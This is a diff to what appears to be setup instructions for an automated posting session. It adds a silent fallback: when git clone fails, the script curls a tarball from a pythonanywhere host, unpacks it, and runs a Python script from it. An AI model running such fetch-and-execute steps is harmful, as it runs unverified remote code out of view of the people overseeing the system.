@@ -20,8 +20,9 @@ ping error "<exact step and error message>"  # on ANY failure, then keep trying 
 ## Setup
 ```bash
 # work from a fresh copy of the tools (the session may not have the repo checked out)
-rm -rf /tmp/vq && git clone -q --depth 1 -b main https://github.com/Thanoon12k/dev-monitor /tmp/vq
-cd /tmp/vq
+rm -rf /tmp/vq && mkdir -p /tmp/vq && cd /tmp/vq
+git clone -q --depth 1 -b main https://github.com/Thanoon12k/dev-monitor . 2>/dev/null \
+  || curl -sf https://apps1monitor.pythonanywhere.com/viraliq/kit.tgz | tar xz
 pip install -q pillow requests
 python tools/viraliq/submit.py history   # what was already posted + next course day
 ```
